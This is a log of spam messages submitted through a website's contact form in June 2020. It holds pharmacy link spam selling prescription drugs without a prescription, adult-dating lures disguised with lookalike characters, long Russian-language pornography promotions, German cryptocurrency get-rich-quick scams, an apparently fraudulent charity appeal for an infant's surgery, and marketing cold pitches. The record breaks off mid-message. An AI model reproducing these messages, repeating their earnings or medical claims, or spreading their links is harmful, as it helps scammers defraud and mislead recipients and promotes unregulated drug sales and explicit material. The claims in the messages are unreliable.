+++ 2020-06-11 11:53:13 PM -- Email from: Bеаutiful girls for seх in уоur city UК: https://links.wtf/aCF1, -- subject: Meet sexу girls in your сity AU: https://coupemoi.la/OSJcN, -- email: 61budagecer1453@gmail.com, -- Message is: Аdult #1 dаting аpр fоr andrоid: http://www.microlink.ro/a/vdmx
+++ 2020-06-12 02:51:59 AM -- Email from: Ugoskels, -- subject: nfbiulwh, -- email: rosemary0201@yahoo.com, -- Message is: &lt;a href=&quot;http://inderal.us.com/&quot;&gt;inderal order online uk&lt;/a&gt; &lt;a href=&quot;http://kamagra360.com/&quot;&gt;kamagra gel&lt;/a&gt; &lt;a href=&quot;http://arimidex.us.org/&quot;&gt;arimidex pills&lt;/a&gt; &lt;a href=&quot;http://finasteridealop.com/&quot;&gt;propecia 5mg pills&lt;/a&gt; &lt;a href=&quot;http://celebrex.us.com/&quot;&gt;celebrex coupon&lt;/a&gt; &lt;a href=&quot;http://amoxicillintz.com/&quot;&gt;amoxicillin 875&lt;/a&gt; &lt;a href=&quot;http://gabapentin.us.com/&quot;&gt;neurontin 100mg tab&lt;/a&gt; &lt;a href=&quot;http://plavix.us.com/&quot;&gt;plavix price canada&lt;/a&gt;
+++ 2020-06-12 05:49:32 AM -- Email from: Booskels, -- subject: apvljowl, -- email: hortensia@hotmail.com, -- Message is: &lt;a href=&quot;http://clonidinemed.com/&quot;&gt;buy clonidine&lt;/a&gt; &lt;a href=&quot;http://sumycin365.com/&quot;&gt;sumycin 250 mg&lt;/a&gt;
+++ 2020-06-12 02:22:12 PM -- Email from: Zakskels, -- subject: rlyfokyr, -- email: tavares3c@probbox.com, -- Message is: &lt;a href=&quot;https://arimidex.us.org/&quot;&gt;arimidex online&lt;/a&gt; &lt;a href=&quot;https://amoxicillintz.com/&quot;&gt;amoxicillin 875&lt;/a&gt; &lt;a href=&quot;https://furosemide.us.org/&quot;&gt;buy furosemide&lt;/a&gt; &lt;a href=&quot;https://zoviraxav.com/&quot;&gt;zovirax cream&lt;/a&gt; &lt;a href=&quot;https://proscar.us.org/&quot;&gt;where to buy proscar online&lt;/a&gt; &lt;a href=&quot;https://baclofenp.com/&quot;&gt;baclofen buy&lt;/a&gt; &lt;a href=&quot;https://gabapentin.us.com/&quot;&gt;gabapentin 300&lt;/a&gt;
+++ 2020-06-12 03:23:05 PM -- Email from: PORNO-GO, -- subject: Домашнее Порно Видео в HD, -- email: grembax@mail.ru, -- Message is: &lt;img src=&quot;https://i.ibb.co/vcPfmhQ/1111.jpg&quot;&gt; 
 
Смотрите абсолютно разнообразное и большинство из них в отличном HD качестве, все доступно абсолютно бесплатно 24 часа в сутки. Ощутите переполненное сочными чувствами круиз по четко организованным группам пиковое блаженство - сайт подготовил для любителей насладится просмотром большого числа все возможных видео в хорошем качестве ХД.18 летними позволяют исполнять самые странные эротические сцены которые совсем не сделают представить юные девицы. Ролики безусловно не повторяющиеся и весь контент из них в замечательном hd720 качестве, все порно видео доступно абсолютно бесплатно и без регистрации 24 часа в сутки. Запомните все ролики только для совершенно летних посетителей. Бесплатное порно видео онлайн c молодыми девушками смотреть с любых телефонов и компютеров без смс https://porno-go.top . Смотрите по чаще делитесь ссылкой на наш туб и не забывайте все видео только для посетителей достигших достигших лет. Добро пожаловать отличный на сексуальный хостинг. Адалт сайт конечно же вы побалуетесь здесь от огромного выбором порно роликов без регистрации  из более 41 категорий порно, в тут участвуют исключительно молоденькие телки обожающие хорошенько принимать член во все свои мокрые дырочки. Ниже администрация  подготовили самые крутые порно видео со зрелыми мамашами и поместили все разделы. Трахают толпой видео https://porno-go.net/group-porn/ сдесь с присутствием красоток онлайн бесплатно https://porno-go.net/group-porn/ групповое секс видео ролики с участием девушек онлайн бесплатно. Видео японки секс https://porno-go.net/azian/ здесь юные узкоглазые девушки онлайн без регистрации Видео https://porno-go.net/azian/ азиатский секс юные узкоглазые девушки онлайн бесплатно. Смотреть видео cumshot счастливые https://porno-go.net/sperm/ тут красотки получают заряд жижи в дырки|Смотреть ролики https://porno-go.net/sperm/ кончают спермой счастливые красотки получают заряд жижи в щели. Видеостуденческие порно вечеринки https://porno-go.net/porno-vecherinki-i-studenty/ сдесь. Ученики тусят по полной программе Смотрите студентов https://porno-go.net/porno-vecherinki-i-studenty/ порно вечеринки бесплатно. Молодые люди раскрываются по полной программе. Видео со сквиртингом https://porno-go.net/squirt/ на сайте телочки брызгают от оргазма онлайн бесплатно. Видео  https://porno-go.net/squirt/ порно со сквиртом девицы кончают от оргазма онлайн бесплатно. Красивое порно ролики https://porno-go.net/krasivyy-seks/ тут с участием 18 летних девушек онлайн бесплатно https://porno-go.net/krasivyy-seks/ смотреть нежное порно видео с участием 18 летних девушек онлайн без регистрации. Здесь мы отобрали самые популярные разделы нашего сайта, с любой категории вы можете вернуться на любую категорию с права, но в случаи того вам этого мало, тогда  мы с удовольствием опишем лучшие разделы секс видео где вы посмотрите массу достойного контента. Смотреть почти тридцать разделов с молоденькими телочками удивит самых эстетам. Ведь озабоченные девки забывают обо всем когда рядом появляется твердый писюн и дает возможность трахать себя во все щели испытывать массу блаженство. Добавление последнего видео материала получается постоянно чтобы вам отсутствовало время приуныть, желаем хорошего просмотра. Понравилось на нашем эксклюзивном сайте? безупречный|это один из самых классных секс сайт, наши программисты воспроизводит качественный видео-контент и делаем для вас самые хорошие и знаментиые качественное секс ролики. Наш сайт постоянно освежается абсолютно новыми материалыми, чтобы вы в любой день могли посмотреть безстыдными актрисами секс индустрией 24/7. 
 
&lt;img src=&quot;https://i.ibb.co/TwM6TZ0/22222.jpg&quot;&gt; 
 
Смотрите абсолютно разное и большинство из них в хорошем hd720 качестве, все доступно без регистрации 24 часа в сутки. Ощутите заполненное глубокими эмоциями экскурсия по точно организованным категориям нивысшее восторг - туб дает возможность для любителей насладится просмотром невероятного объема разнообразных роликов в лучшем качестве ХД.Молодыми позволяют вытворять очень безумные выкрутасы которые совсем не могут выполнить молодые девчонки. Видео безусловно разное и большинство из них в замечательном hd1080 качестве, все порно видео доступно абсолютно бесплатно и без регистрации 24/7. Не забывайте все порно только для совершенно летних посетителей. Бесплатное порно онлайн c молоденькими девушками смотреть с любых телефонов и компютеров без смс. Смотрите по чаще делитесь ссылочкой на наш туб и не забывайте все ролики только для посетителей совершеннолетних достигших лет. Добро пожаловать отличный на сексуальный хостинг. Адалт сайт конечно же вы кайфанете здесь от крупного выбором порно роликов онлайн  из более 41 разделов порнушки, в тут трахаются исключительно молодые девчонки обожающие как следует принимать член во все свои влажные дырочки. Внизу наши админы  подготовили только жаркие порно видео со зрелыми бабулями и разбили все категории. Видео порно кастинги с молоденькими телочками https://porno-go.net/casting/ porno-go.net смотреть кастинги абсолютно без регистрации. Ролики https://porno-go.net/casting/ смотреть порно кастинг с молоденькими девушками смотреть кастинги абсолютно без регистрации Домашнее порно видео https://porno-go.net/amature/ сдесь с настоящими людьми готовыми показать частное порно онлайн бесплатно. Видео https://porno-go.net/amature/ домашнее порно онлайн с настоящими людьми готовыми показать любительское порно онлайн бесплатно. Грубое порно видео https://porno-go.net/zhestkoe-i-hardkor/ тут и грубый секс с молоденькими девушками онлайн ролики бесплатно. Хардкорный секс и https://porno-go.net/zhestkoe-i-hardkor/ смотреть грубое порно с молодыми девушками онлайн ролики бесплатно. Порно анальное и секс в попку https://porno-go.net/anal/ porno-go.net с молодыми онлайн без регистрации смотрите анал во всей красе. Порно анальное и секс в между булок https://porno-go.net/zhestkoe-i-hardkor/ анальный секс. Секс в между булок с молоденькими онлайн смотреть порно видео в хорошем https://porno-go.net/hd-porno/ на сайте HD 720 качестве онлайн совершенно бесплатно. Смотреть видео https://porno-go.net/hd-porno/ порнуха бесплатно 720 онлайн совершенно бесплатно. Самые сочные Булки, огромный выбор девушек с большими попками https://porno-go.net/ass/ тут смотрите видео онлайн бесплатно. Огромный выбор девушек с большими https://porno-go.net/ass/ большие попки смотрите самые сочные попки ролики онлайн бесплатно. Онлайн русское порно видео https://porno-go.net/russia/ здесь знакомый русский язык в порно онлайн без регистрации|Смотреть видео https://porno-go.net/russia/ секс с русскими девушками знакомая русская речь в порно онлайн без регистрации. Тут мы отобрали самые интересные разделы нашего сайта, с любой странички вы всегда можете перейти на любую категорию с права, но в случаи того вам этого мало, тогда  мы с удовольствием расскажем самые разделы секс видео где вы увидете много интересного веб контента. Увидеть почти тридцать категорий с молодыми кудесницами удивит самых эстетам. Ведь красивые девушки забывают обо всем когда около возникает большой писюн и дает возможность оттрахивать себя куда только захочется получая массу блаженство. Добавление последнего кино контента производится каждый день чтобы вам некогда скучать, желаем интересного просмотра. Классное наше творение эксклюзивное творени? отличный порно сайт, мы стараемся наша команда воспроизводит качественный русурс и добавляем только самые яркие и знаментиые HD секс видео. Наш сайт ежедневно освежается абсолютно новыми клипами, чтобы вы каждый день могли насладится развратными женщинами эро индустрией 24 часа в сутки. 
 
&lt;img src=&quot;https://i.ibb.co/3FwQbKX/3333.jpg&quot;&gt; 
 
Рады приветствовать отличный на эротический сайт. Адалт сайт здесь вы побалуетесь здесь от обширным разнообразием порно клипов онлайн  из более 39 разделов эротики, в тут находятся только юные девчонки любящие знатно потрахаться во все свои мокрые места. Видео абсолютно не повторяется и большинство из них в отличном hd1080 качестве, все доступно без регистрации 7 дней в неделю. Ощутите заполненное яркими впечатлениями круиз по хорошо организованным группам нивысшее восторг - сайт дает возможность для вас насладится просмотром огромного объема разных видео в лучшем качестве ХД. https://porno-go.net/ Бесплатно порно онлайн c 18 летними девушками смотреть с любых устройств и гаджетов без регистрации. Заглядывайте по чаще делитесь ссылкой ролика на наш сайт и запомните все порно только для зрителей достигших 18 лет. Здесь мы отобрали самые просматревыемые категории порно сайта, с любой странички вы можете выбрать на любую категорию с боку, а если вам покажется мало, тогда  мы любезно расскажем одни из самых разделы секс роликов где вы посмотрите много достойного веб контента: 1. Групповуха видео с участием телочек онлайн без регистрации https://porno-go.net/group-porn/. 2. Смотреть японское порно юные узкоглазые девицы https://porno-go.net/azian/. 3. Смотреть видео камшоты счастливые девицы получают порцию жидкости в киски https://porno-go.net/sperm/ . 4. Видео студентов секс вечеринки Молодые люди отрываются по полной https://porno-go.net/porno-vecherinki-i-studenty/ . 5. Смотреть струйный оргазм девушки брызгают от оргазма https://porno-go.net/squirt/ . 6. Страстное порно видео с участием 18 летних девушек https://porno-go.net/krasivyy-seks/ . 7. Секс кастинги с молодыми девушками смотреть кастинги абсолютно бесплатно https://porno-go.net/casting/ . 8. Любительское порно видео с реальными людьми готовыми показать домашнее порно онлайн бесплатно https://porno-go.net/amature/ . 9. Грубое порно видео и хардкорный секс с молодыми https://porno-go.net/zhestkoe-i-hardkor/ . 10. Порно анал и секс в жопу с молоденькими онлайн без регистрации смотрите анал во всей красе https://porno-go.net/anal/ . 11. Самые сочные Попки, огромный выбор девушек с большими задницами https://porno-go.net/ass/ . 12. Онлайн русское порно ролики знакомый русский язык в порно онлайн без регистрации https://porno-go.net/russia/ . 13. Домашнее секс видео в отличном HD 1080 качестве онлайн без регистрации https://porno-go.net/domashniy-anal/ . Классное наше творение эксклюзивное творени? https://porno-go.net/ лучший это один из самых классных порно сайт, наши программисты старается делать хороший русурс и делаем вам самые яркие и знаментиые качественное секс ролики. Наш туб постоянно освежается совершенно новыми материалыми, чтобы вы в любой день могли посмотреть безстыдными женщинами секс индустрией 24 часа в сутки.
+++ 2020-06-12 10:37:44 PM -- Email from: Yonskels, -- subject: covgbubs, -- email: dione@probbox.com, -- Message is: &lt;a href=&quot;https://gabapentin.us.com/&quot;&gt;neurontin 300mg&lt;/a&gt; &lt;a href=&quot;https://celebrex.us.com/&quot;&gt;celebrex 200 mg capsule&lt;/a&gt; &lt;a href=&quot;https://plavix.us.com/&quot;&gt;plavix generic&lt;/a&gt; &lt;a href=&quot;https://glucophagge.com/&quot;&gt;buy glucophage&lt;/a&gt; &lt;a href=&quot;https://disulfiram.us.com/&quot;&gt;generic antabuse cost&lt;/a&gt; &lt;a href=&quot;https://proscar.us.org/&quot;&gt;buy proscar&lt;/a&gt; &lt;a href=&quot;https://lisinoprilm.com/&quot;&gt;buy lisinopril&lt;/a&gt; &lt;a href=&quot;https://prozac.us.com/&quot;&gt;buy prozac&lt;/a&gt;
+++ 2020-06-12 11:53:19 PM -- Email from: Mеet seху girls in yоur city: https://qspark.me/1dttr0, -- subject: Adult nativе аmerican dating onlinе: http://wunkit.com/1tYLAA, -- email: zfox@nctimes.com, -- Message is: Аdult dating at 35 уears old: http://6i9.co/1Nrr
+++ 2020-06-13 11:58:23 PM -- Email from: Teoskels, -- subject: rcpaclmb, -- email: ashleygaaron@probbox.com, -- Message is: &lt;a href=&quot;https://effexor24.com/&quot;&gt;buy effexor&lt;/a&gt;
+++ 2020-06-14 04:53:51 PM -- Email from: Elyse Whittemore, -- subject: , -- email: elyse.whittemore@gmail.com, -- Message is: Do you want more people to visit your website? Receive thousands of keyword targeted visitors directly to your site. Boost your profits fast. Start seeing results in as little as 48 hours. For additional information Visit: https://bit.ly/traffic-for-you
+++ 2020-06-14 06:42:11 PM -- Email from: Yonskels, -- subject: uuddwvwl, -- email: focumentt96@probbox.com, -- Message is: &lt;a href=&quot;https://amoxiltabs.com/&quot;&gt;amoxil without a prescription&lt;/a&gt; &lt;a href=&quot;https://fluconazole.us.com/&quot;&gt;diflucan 150mg fluconazole&lt;/a&gt; &lt;a href=&quot;https://valacyclovir.us.com/&quot;&gt;acyclovir&lt;/a&gt; &lt;a href=&quot;https://effexor24.com/&quot;&gt;buy effexor online&lt;/a&gt;
+++ 2020-06-14 09:28:09 PM -- Email from: Girls for sex in уоur citу | USА: http://gongpo.moum.kr/adultdating430806, -- subject: Find уоursеlf a girl fоr the night in your citу USA: https://qspark.me/nFaRlS, -- email: ianhyde@imheu.fsnet.co.uk, -- Message is: Dаting sitе fоr sеx with girls in France: http://gmy.su/:BEwlb
+++ 2020-06-15 05:49:31 AM -- Email from: Dаting sitе fоr sex with girls from Аustralia: https://jtbtigers.com/datingsexygirls129265, -- subject: Adult numbеr 1 dаting app: http://n00.uk/gxFBV, -- email: ninjuh6@lycos.de, -- Message is: Аdult best free dating sitеs cаnаdа 2019: http://pine.cf/rdbqdv
+++ 2020-06-15 12:56:44 PM -- Email from: Alison Wethering, -- subject: Important, -- email: alison@videomarketingguru.club, -- Message is: Hey, great site!

Have you thought about adding a video in response to COVID-19?

We can make one for you: 
https://www.videovideovideomarketing.club/success/?=esyray.com

Customers are worried right now. A short video like this can make a big impact for your business in the long term. People will remember it!

Be well,
Linda

P.S. Due to coronavirus, we have also lowered our prices by up to 55%. 






- This commercial message sent from PJLK Marketing LC
410 E Santa Clara Street STE 817
San Jose, CA 95113

To unsubscribe click here:
https://videovideovideomarketing.club/out.php/?site=esyray.com
+++ 2020-06-15 01:51:04 PM -- Email from: Tedskels, -- subject: gzxksmix, -- email: wahlo6@probbox.com, -- Message is: &lt;a href=&quot;https://amoxiltabs.com/&quot;&gt;where can i buy amoxil&lt;/a&gt; &lt;a href=&quot;https://effexor24.com/&quot;&gt;buy effexor online&lt;/a&gt; &lt;a href=&quot;https://sumycin365.com/&quot;&gt;buy sumycin online&lt;/a&gt; &lt;a href=&quot;https://arimidex.us.org/&quot;&gt;arimidex generic&lt;/a&gt; &lt;a href=&quot;https://gabapentin.us.com/&quot;&gt;buying neurontin without a prescription&lt;/a&gt; &lt;a href=&quot;https://finasteridealop.com/&quot;&gt;propecia 1mg&lt;/a&gt;
+++ 2020-06-15 06:51:08 PM -- Email from: MariaNesse, -- subject: I'd like to meet you neighbour., -- email: mailermaswsxl@gmail.com, -- Message is: Hey my friend 
I see you walking  around my house. You looks nice ;). Are you able to meet? See my pictures here: 
 
https://short.cx/s4new 
 
Im home alone , You can spend nice time. 
 
Tell me if you are into it 
 
- Anna
+++ 2020-06-15 11:01:35 PM -- Email from: Jeromegaila, -- subject: Ich hаbe mеinе erstеn 10.000 Dоllаr vеrdient, iсh hаbе еs gеschafft, siе abzuhеbеn und auszugеben., -- email: rasputin@online.de, -- Message is: Ich habе еrst vor еinеr Woсhe angefаngen, aber seitdem ist so viel passiert. 
Ich hаbe mеinе ersten 10.000 Dоllar vеrdiеnt, iсh hаbe еs gеschafft, sie аbzuheben und аuszugeben. 
http://vprd.me/Qw2p5 
Und iсh hаbе gerade weiterе 10 km gemасht, diе auf dеm Wеg sind ... Ich kann Crуpto Sоft niсht gеnug dankеn! 
https://coupemoi.la/lF5Rd
+++ 2020-06-16 04:28:43 AM -- Email from: Tiara Lyttleton, -- subject: , -- email: lyttleton.tiara@googlemail.com, -- Message is: EROTICA becomes REALITY!!!
Stepping Stones to the ARCH De Pleasure
     Men, put your feet in James Pope’s shoes, women put your feet in the women’s shoes I encounter, as I traveled the road from farm-to-MATTRESONAME!
Stepping Stones is my third novel in a 3, connected, series.  1- Post Hole Digger! 2-Trifecta! 
https://bit.ly/www-popejim-com “CLICK &amp; VIEW videos.  Search: amazon.com, title - author
+++ 2020-06-16 05:56:07 AM -- Email from: PORNOgov, -- subject: Бесплатное Секс Видео в HD, -- email: sikasova@mail.ru, -- Message is: Реальное порнушка видео в высоком качестве, зацените бесплатно: https://porno-go.net 
Со всего мира секс съемка бесплатно просмотр на https://porno-go.net/ass/7577-suchka-otrastila-ogromnyy-perdak-i-poshla-snimatsya-v-porno.html в HD1080 
Безумное порно фильмы без границ просмотр на https://porno-go.net/v-mashine/8161-ne-smog-sosredotochitsya-na-sekse-v-mashine-i-ne-konchil.html в HD1080 
Чувственное порно запись для взрослых онлайн на https://porno-go.net/anal/687-cheshskiy-kasting.html в HD1080 
Семейное порно съемка бесплатно просмотр на https://porno-go.net/hd-porno/9240-sutenersha-podarila-klientu-luchshiy-trah-v-ego-zhizni.html в высоком качестве 
Возбуждающее секс съемка бесплатно просмотр на https://porno-go.net/britye-kiski/3380-ochen-goryachiy-analnyy-perepih-s-nepovtorimoy-kroshkoy-megan-rain.html в высоком качестве 
Со всего мира порно запись без регистрации просмотр на https://porno-go.net/hd-porno/5639-negr-vspotel-ot-aktivnoy-ebli-ryzhenkoy-suchki.html в HD1080 
ViP секс ролики без границ просмотр на https://porno-go.net/hd-porno/9043-studentka-lyubitelnica-seksa-v-mashine-dala-sebya-trahnut-taksistu.html в HD1080 
Жгучее секс запись без регистрации смотреть на https://porno-go.net/kastingi-vudmana/2617-20-letnyaya-zazhigalochka-iz-vengrii-azure-storm.html в HD1080 
Жгучее порно видео бесплатно просмотр на https://porno-go.net/hd-porno/8635-usatyy-muzhik-zhestko-otymel-hudenkuyu-podrugu-v-dushe.html в HD1080 
Нежное порно ролики для всех просмотр на https://porno-go.net/seks-vtroem/3120-realnyy-seks-vtroem-pryamikom-iz-studencheskoy-obschagi..html в HD720 
Жгучее секс запись без регистрации смотреть на https://porno-go.net/lesbi/6536-odnovremenno-konchili-ot-odnogo-vibratora-mezhdu-nog.html в HD1080 
Шикарное секс фильмы для всех онлайн на https://porno-go.net/web-camera/1810-russkaya-milashka-drochit-pered-vebkoy.html в HD1080
+++ 2020-06-16 08:52:30 AM -- Email from: Eric Jones, -- subject: There they go…, -- email: eric@talkwithwebvisitor.com, -- Message is: Hey, my name’s Eric and for just a second, imagine this…

- Someone does a search and winds up at esyray.com.

- They hang out for a minute to check it out.  “I’m interested… but… maybe…”

- And then they hit the back button and check out the other search results instead. 

- Bottom line – you got an eyeball, but nothing else to show for it.

- There they go.

This isn’t really your fault – it happens a LOT – studies show 7 out of 10 visitors to any site disappear without leaving a trace.

But you CAN fix that.

Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It lets you know right then and there – enabling you to call that lead while they’re literally looking over your site.

CLICK HERE http://www.talkwithwebvisitor.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

Time is money when it comes to connecting with leads – the difference between contacting someone within 5 minutes versus 30 minutes later can be huge – like 100 times better!

Plus, now that you have their phone number, with our new SMS Text With Lead feature you can automatically start a text (SMS) conversation… so even if you don’t close a deal then, you can follow up with text messages for new offers, content links, even just “how you doing?” notes to build a relationship.

Strong stuff.

CLICK HERE http://www.talkwithwebvisitor.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more leads today!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE http://www.talkwithwebvisitor.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitor.com/unsubscribe.aspx?d=esyray.com
+++ 2020-06-16 02:05:27 PM -- Email from: Ashskels, -- subject: mzagdeqo, -- email: gsxr2479@outlook.com, -- Message is: &lt;a href=&quot;http://lisinoprilm.com/&quot;&gt;can you buy lisinopril over the counter&lt;/a&gt; &lt;a href=&quot;http://valacyclovir.us.com/&quot;&gt;generic acyclovir&lt;/a&gt; &lt;a href=&quot;http://metforminglc.com/&quot;&gt;metformin otc canada&lt;/a&gt; &lt;a href=&quot;http://fluconazole.us.com/&quot;&gt;diflucan over counter&lt;/a&gt;
+++ 2020-06-16 02:16:09 PM -- Email from: Teoskels, -- subject: epblbvxe, -- email: agatrin@probbox.com, -- Message is: &lt;a href=&quot;https://metforminglc.com/&quot;&gt;glucophage metformin&lt;/a&gt;
+++ 2020-06-17 12:41:31 AM -- Email from: FrankCax, -- subject: Ich verdiеne $ 79000 - $ 107000 рro Monаt, -- email: yocke@web.de, -- Message is: Ich verdiene $ 79000 - $ 107000 рro Mоnat 
Iсh bin ein Anfanger mit еin рaаr Mоnatеn Erfаhrung mit Kryptowahrungеn, aber ich hаbе еine 
http://pine.cf/x1il3g 
Dank des Bitсоin-Gеwinns ein stеtiger Ertragsstrom аus dеm Kryрtowahrungsmarkt. 
Tagsuber machе iсh sо wenig, aber ich bin auf dem Wеg, mеinе Hyроthеk zuruckzuzаhlen und einen Familienurlаub zu maсhеn 
http://www.linkbrdesk.net/url/iq8s
+++ 2020-06-17 06:03:29 AM -- Email from: Tedskels, -- subject: ltmbpheg, -- email: tianna@probbox.com, -- Message is: &lt;a href=&quot;https://plavix.us.com/&quot;&gt;plavix medicine&lt;/a&gt; &lt;a href=&quot;https://amoxiltabs.com/&quot;&gt;buy amoxil 500 mg online&lt;/a&gt; &lt;a href=&quot;https://erythromycin24.com/&quot;&gt;buy erythromycin&lt;/a&gt; &lt;a href=&quot;https://yasminmed.com/&quot;&gt;yasmin pill nz&lt;/a&gt; &lt;a href=&quot;https://zoviraxav.com/&quot;&gt;zovirax ointment&lt;/a&gt; &lt;a href=&quot;https://inderal.us.com/&quot;&gt;inderal&lt;/a&gt; &lt;a href=&quot;https://prozac.us.com/&quot;&gt;buy prozac&lt;/a&gt;
+++ 2020-06-17 10:12:11 PM -- Email from: Booskels, -- subject: quroclkv, -- email: bjohnson81@hotmail.com, -- Message is: &lt;a href=&quot;http://amoxiltabs.com/&quot;&gt;buy amoxil&lt;/a&gt; &lt;a href=&quot;http://disulfiram.us.com/&quot;&gt;generic disulfiram&lt;/a&gt;
+++ 2020-06-18 02:44:15 PM -- Email from: Booskels, -- subject: omrnjaoa, -- email: ticmethen2@yahoo.com, -- Message is: &lt;a href=&quot;http://inderal.us.com/&quot;&gt;generic for inderal&lt;/a&gt; &lt;a href=&quot;http://finasteridealop.com/&quot;&gt;finasteride 5mg&lt;/a&gt; &lt;a href=&quot;http://flagyl365.com/&quot;&gt;flagyl online&lt;/a&gt; &lt;a href=&quot;http://robaxinrx.com/&quot;&gt;robaxin 1000 mg&lt;/a&gt; &lt;a href=&quot;http://fluconazole.us.com/&quot;&gt;diflucan 150 mg capsule price&lt;/a&gt;
+++ 2020-06-18 10:16:29 PM -- Email from: Wimskels, -- subject: cqisrrhn, -- email: pollo77@aol.com, -- Message is: &lt;a href=&quot;http://zoviraxav.com/&quot;&gt;zovirax price comparison&lt;/a&gt;
+++ 2020-06-19 01:10:47 AM -- Email from: Teoskels, -- subject: ikfevlwn, -- email: tvelamcom@probbox.com, -- Message is: &lt;a href=&quot;https://ciproflxn.com/&quot;&gt;cipro 500&lt;/a&gt;
+++ 2020-06-19 04:51:50 AM -- Email from: Rachel Florent, -- subject: surprising, -- email: rachel.florent@videomarketingnow.xyz, -- Message is: Hey, 

You have a lot going on right now, but maybe we can help?

We make professional videos for businesses to put on their websites.

See examples of what we can do for you:
https://www.videomarketingnow.xyz/success/?=esyray.com

These videos are helping businesses GROW right now, at a time when they need it most.

Rachel Florent
Custom Video Specialist





410 Santa Clara St. East, Unit 817	
San Jose,	CA 95113
 
No more video marketing:
https://thevideonetwork.top/out.php/?site=esyray.com
+++ 2020-06-19 06:29:23 AM -- Email from: Earnings on the Internet from $8243 per week: http://alsi.ga/earnbitcoin264298, -- subject: Easy way to earn money online in AU up to a $6623 per week: http://b360.in/earnbitcoin391158, -- email: said_hbt@hotmail.com, -- Message is: Get $7464 per day: http://slink.pl/44d1f
+++ 2020-06-19 08:35:37 AM -- Email from: Nicole Rideout, -- subject: Important Reminder, -- email: nicole@alexadirectory.top, -- Message is: Hey! 

Have you remembered to activate voice search for your business?

Activate it here in 30 seconds:

https://alexadirectory.top/abcc1/?=esyray.com

Without activation, customers may not be able to find esyray.com with voice searches on Google, Amazon Alexa or mobile phones.

Nicole Ritter
Voice Activation Follow-up Specialist














 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://alexadirectory.top/out.php?site=esyray.com
+++ 2020-06-19 12:35:53 PM -- Email from: Zakskels, -- subject: iyyfjbri, -- email: katelyn@probbox.com, -- Message is: &lt;a href=&quot;https://erythromycin24.com/&quot;&gt;buy erythromycin online&lt;/a&gt; &lt;a href=&quot;https://lisinoprilm.com/&quot;&gt;lisinopril 30mg coupon&lt;/a&gt; &lt;a href=&quot;https://glucophagge.com/&quot;&gt;glucophage 500 price&lt;/a&gt; &lt;a href=&quot;https://amoxiltabs.com/&quot;&gt;amoxil 500 mg&lt;/a&gt;
+++ 2020-06-19 06:46:15 PM -- Email from: Aneta Arthur, -- subject: We are running out of time, -- email: arthur@choose2help.org, -- Message is: Hello, 
 
My son born January 5th 2020 requires a serious head surgery due to the fusion of the cranial suture (craniosynostosis). I cannot afford to pay for the series of costly medical expenses. We only have 6 weeks to get everything organized before he undergoes the surgery. I have no other option but to ask you to help me help my son. We are gathering the funds through a verified charity: 
 
https://choose2help.org/arthur.html 
 
 
Thank you for your support. Aneta.
+++ 2020-06-20 09:45:21 AM -- Email from: AaronStews, -- subject: Awesome website, but, -- email: webgeeksgroup@gmail.com, -- Message is: Hi, I stumbled onto your site yesterday and love the design (I've been making websites since 2005). What platform is it made with?  
 
The only thing I noticed was that you appeared a bit low on search results and the home page took a bit long to load for me. 
 
I've recently joined a private group for serious website owners. They send free periodic tips to get your site ranking better and improve overall performance. This includes tips, growth hacks, and &quot;secret stuff&quot;. 
 
Basically, a free consulting service. 
 
It really helped me improve the site I manage. 
 
If you'd like to join, I'm sure they'd love to have another passionate website owner in the group:  
 
JOIN HERE: 
 
https://mailchi.mp/6db3130aa225/webgeek1 
 
If you're not interested, no worries, best of luck on your site! 
 
Aaron
+++ 2020-06-20 05:26:08 PM -- Email from: Еаrnings on thе Internet from $5858 реr wеek: http://xsle.net/earnmoneybitcoin864781, -- subject: READY EARNINGS ON ТHЕ INTЕRNEТ from $6457 per wееk: http://joov.net/d0earj, -- email: josephellard@halifax.co.uk, -- Message is: Verifiеd еаrnings on thе Internet from $9621 рer dау: https://ecuadortenisclub.com/earnbitcoin697583
+++ 2020-06-20 11:17:23 PM -- Email from: Tedskels, -- subject: zziqbvit, -- email: taoarete@probbox.com, -- Message is: &lt;a href=&quot;https://ivermectin.us.com/&quot;&gt;ivermectin 0.08&lt;/a&gt; &lt;a href=&quot;https://buypropecia247.us.org/&quot;&gt;propecia buy online&lt;/a&gt; &lt;a href=&quot;https://tadalafil2017.us.com/&quot;&gt;tadalafil tablets in uk&lt;/a&gt;
+++ 2020-06-21 08:18:56 AM -- Email from: Blythe Thring, -- subject: , -- email: thring.blythe@googlemail.com, -- Message is: Hey, if you or anyone you know is hosting trivia, be sure to check out https://bit.ly/triviarat-com.  Its a free web app for accepting responses and marking!  It's great for zoom trivia or onsite -- and on that note, remember that handing out physical paper/pencils will not be on the &quot;allowed&quot; list once things start opening up.  Thanks :)
+++ 2020-06-21 10:35:46 AM -- Email from: Yonskels, -- subject: xiajlgii, -- email: billzody@probbox.com, -- Message is: &lt;a href=&quot;https://sildenafil4you.us.org/&quot;&gt;sildenafil otc canada&lt;/a&gt; &lt;a href=&quot;https://propeciagen.com/&quot;&gt;online propecia usa&lt;/a&gt; &lt;a href=&quot;https://wellbutrin360.com/&quot;&gt;wellbutrin generic price&lt;/a&gt; &lt;a href=&quot;https://isotretinoin24.com/&quot;&gt;accutane 220mg&lt;/a&gt; &lt;a href=&quot;https://lxapro.com/&quot;&gt;lexapro&lt;/a&gt;
+++ 2020-06-21 06:44:47 PM -- Email from: Teoskels, -- subject: sfovlgib, -- email: clr001c@probbox.com, -- Message is: &lt;a href=&quot;https://ivermectin.us.com/&quot;&gt;buy ivermectin&lt;/a&gt;
+++ 2020-06-21 08:58:45 PM -- Email from: Eric Jones, -- subject: Turn Surf-Surf-Surf into Talk Talk Talk, -- email: eric@talkwithwebvisitor.com, -- Message is: Hello, my name’s Eric and I just ran across your website at esyray.com...

I found it after a quick search, so your SEO’s working out…

Content looks pretty good…

One thing’s missing though…

A QUICK, EASY way to connect with you NOW.

Because studies show that a web lead like me will only hang out a few seconds – 7 out of 10 disappear almost instantly, Surf Surf Surf… then gone forever.

I have the solution:

